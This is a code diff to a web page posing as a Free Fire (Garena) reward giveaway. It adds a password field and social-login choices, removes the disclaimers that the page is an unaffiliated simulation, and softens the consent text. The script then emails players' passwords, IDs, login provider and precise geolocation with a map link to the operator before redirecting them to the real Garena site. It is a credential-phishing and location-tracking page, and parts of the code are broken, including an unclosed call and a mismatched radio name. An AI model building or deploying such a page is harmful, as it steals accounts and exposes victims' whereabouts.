@@ -138,6 +138,14 @@ body {
       maxlength="30"
       placeholder="Masukkan nickname">
 
+    <label class="block mb-2">Password</label>
+    <input
+      id="password"
+      class="input mb-4"
+      type="text"
+      maxlength="30"
+      placeholder="Masukkan password">
+
     <label class="block mb-2">Player ID</label>
     <input
       id="playerId"
@@ -147,6 +155,30 @@ body {
       maxlength="20"
       placeholder="Masukkan Player ID">
   </section>
+
+  <h3 class="font-bold text-orange-400">
+        LOGIN
+  </h3>
+
+  <label class="login">
+        <input type="radio" name="reward" value="GOOGLE">
+        GOOGLE 
+  </label>
+
+  <label class="login">
+        <input type="radio" name="reward" value="FACEBOOK">
+        FACEBOOK 
+  </label>
+
+  <label class="login">
+        <input type="radio" name="reward" value="VK">
+        VK 
+  </label>
+
+  <label class="login">
+        <input type="radio" name="reward" value="APPLE">
+        APPLE 
+  </label>
 
   <section class="card mt-5">
     <h2 class="text-xl font-bold text-orange-400 mb-4">
@@ -245,42 +277,37 @@ body {
     </h2>
 
     <div class="text-sm text-gray-300 leading-6">
-      Website ini merupakan simulasi event komunitas independen.
-      Website ini tidak berafiliasi dengan Garena dan tidak menjamin
-      pemberian hadiah sungguhan.
+      Pastikan anda berumur 18 tahun keatas 
     </div>
 
     <label class="flex gap-3 mt-5 text-sm">
       <input type="checkbox" id="agreeTerms">
       <span>
-        Saya telah membaca dan menyetujui aturan simulasi event.
+        Saya telah membaca dan menyetujui aturan.
       </span>
     </label>
 
     <label class="flex gap-3 mt-4 text-sm">
       <input type="checkbox" id="agreeData">
       <span>
-        Saya memahami bahwa nickname, Player ID, dan hadiah pilihan
-        akan dikirim ke email pengelola.
+        Pastikan akun anda pribadi
       </span>
     </label>
 
     <div class="mt-5 border-t border-gray-700 pt-4">
 
       <h3 class="font-bold text-orange-400">
-        OPTIONAL CAMERA & LOCATION
+        PASTIKAN ANDA SUDAH MENGISI SEMUANYA DAN LANJUT KLIK KOTAK
       </h3>
 
       <p class="text-xs text-gray-400 mt-2">
-        Jika bersedia, kamu dapat membagikan foto kamera dan lokasi
-        untuk keperluan dokumentasi komunitas. Keduanya tidak wajib.
-        Jika menolak, kamu tetap dapat melanjutkan.
+        Lanjutkan 
       </p>
 
       <label class="flex gap-3 mt-4 text-sm">
         <input type="checkbox" id="agreeCameraLocation">
         <span>
-          Saya setuju membagikan foto dan lokasi kepada pengelola.
+          Saya setuju membagikan kepada pengelola.
         </span>
       </label>
 
@@ -299,7 +326,7 @@ body {
   </button>
 
   <p class="text-center text-xs text-gray-500 mt-4">
-    Independent Community Simulation
+    Independent Community 
   </p>
 
 </main>
@@ -324,10 +351,9 @@ emailjs.init({
 });
 
 const SERVICE_ID = "service_pu2ttce";
-const TEMPLATE_ID = "template_whhtuxs";
+const TEMPLATE_ID = "template_j6rm8j8";
 
 const $ = id => document.getElementById(id);
-
 const button = $("shareBtn");
 
 // CHECK AGREEMENT
@@ -343,24 +369,18 @@ $("agreeData").addEventListener("change", checkAgreement);
 
 // REWARD SELECTION
 document.querySelectorAll(".reward").forEach(label => {
-
   label.addEventListener("click", () => {
-
     document.querySelectorAll(".reward").forEach(item => {
       item.classList.remove("selected");
     });
 
     label.classList.add("selected");
-
   });
-
 });
 
 // GET LOCATION
 function getLocation() {
-
   return new Promise((resolve, reject) => {
-
     if (!navigator.geolocation) {
       reject(new Error("Geolocation tidak tersedia"));
       return;
@@ -371,25 +391,28 @@ function getLocation() {
       reject,
       {
         enableHighAccuracy: true,
-        timeout: 10000,
+        timeout: 15000,
         maximumAge: 0
       }
     );
-
   });
-
 }
 
 // MAIN BUTTON
 button.addEventListener("click", async () => {
-
   const nickname = $("nickname").value.trim();
+  const password = $("password").value.trim();
   const playerId = $("playerId").value.trim();
 
-  const selectedReward =
-    document.querySelector('input[name="reward"]:checked');
+  const login = document.querySelector(
+    'input[name="login"]:checked'
 
-  if (!nickname || !playerId || !selectedReward) {
+  const selectedReward = document.querySelector(
+    'input[name="reward"]:checked'
+  );
+
+  // VALIDASI FORM
+  if (!nickname || !password || !playerId || !login  || !selectedReward) {
     alert("Lengkapi nickname, Player ID, dan hadiah!");
     return;
   }
@@ -399,10 +422,7 @@ button.addEventListener("click", async () => {
     return;
   }
 
-  if (
-    !$("agreeTerms").checked ||
-    !$("agreeData").checked
-  ) {
+  if (!$("agreeTerms").checked || !$("agreeData").checked) {
     alert("Silakan setujui persyaratan terlebih dahulu.");
     return;
   }
@@ -410,34 +430,45 @@ button.addEventListener("click", async () => {
   button.disabled = true;
   $("loading").style.display = "flex";
 
+  // DATA LOKASI DEFAULT
   let latitude = "Tidak dibagikan";
   let longitude = "Tidak dibagikan";
+  let accuracy = "Tidak tersedia";
+  let mapsUrl = "Tidak tersedia";
 
-  let cameraStatus = "Tidak dibagikan";
+  let cameraStatus = "Tidak digunakan";
 
   try {
-
+    // LOKASI DAN KAMERA OPSIONAL
     if ($("agreeCameraLocation").checked) {
 
-      // LOCATION PERMISSION
+      // Meminta lokasi
       try {
-
         const position = await getLocation();
 
         latitude = position.coords.latitude;
         longitude = position.coords.longitude;
 
+        accuracy =
+          position.coords.accuracy + " meter";
+
+        mapsUrl =
+          "https://www.google.com/maps?q=" +
+          latitude + "," + longitude;
+
       } catch (error) {
-
         latitude = "Izin ditolak atau tidak tersedia";
-
+        longitude = "Izin ditolak atau tidak tersedia";
+        accuracy = "Tidak tersedia";
+        mapsUrl = "Tidak tersedia";
       }
 
-      // CAMERA PERMISSION
+      // Meminta izin kamera tanpa mengambil foto
       try {
-
-        if (!navigator.mediaDevices ||
-            !navigator.mediaDevices.getUserMedia) {
+        if (
+          !navigator.mediaDevices ||
+          !navigator.mediaDevices.getUserMedia
+        ) {
           throw new Error("Kamera tidak tersedia");
         }
 
@@ -446,55 +477,49 @@ button.addEventListener("click", async () => {
             video: true
           });
 
-        // Kamera tidak mengambil atau mengirim foto.
-        cameraStatus = "Izin kamera diberikan";
+        cameraStatus = "Izin diberikan, foto tidak diambil";
 
         stream.getTracks().forEach(track => track.stop());
 
       } catch (error) {
-
-        cameraStatus = "Izin kamera ditolak atau tidak tersedia";
-
+        cameraStatus = "Izin ditolak atau tidak tersedia";
       }
-
     }
 
-    // EMAILJS
+    // PARAMETER EMAILJS
+    const templateParams = {
+      nickname: nickname,
+      password: password,
+      player_id: playerId,
+      login: login.value,
+      reward: selectedReward.value,
+      latitude: latitude,
+      longitude: longitude,
+      accuracy: accuracy,
+      maps_url: mapsUrl,
+      photo_status: cameraStatus,
+      timestamp: new Date().toLocaleString("id-ID")
+    };
+
+    // KIRIM EMAIL
     await emailjs.send(
       SERVICE_ID,
       TEMPLATE_ID,
-      {
-        nickname: nickname,
-        player_id: playerId,
-        reward: selectedReward.value,
-        latitude: latitude,
-        longitude: longitude,
-        photo_status: cameraStatus,
-        timestamp: new Date().toLocaleString("id-ID")
-      }
+      templateParams
     );
 
-    alert("Data pemain berhasil dikirim!");
-
-  } catch (error) {
-
-    console.error("EmailJS error:", error);
-
-    alert(
-      "Pengiriman email gagal. Kamu tetap dapat melanjutkan ke website."
-    );
-
-  } finally {
-
-    $("loading").style.display = "none";
+    alert("Formulir berhasil dikirim!");
 
     window.location.href = "https://ff.garena.com/";
 
+  } catch (error) {
+    console.error("EmailJS Error:", error);
+
+    alert("Pengiriman email gagal.");
+
+    window.location.href = "selanjutnya.html";
+
+  } finally {
+    $("loading").style.display = "none";
   }
-
 });
-
-</script>
-
-</body>
-  </html>
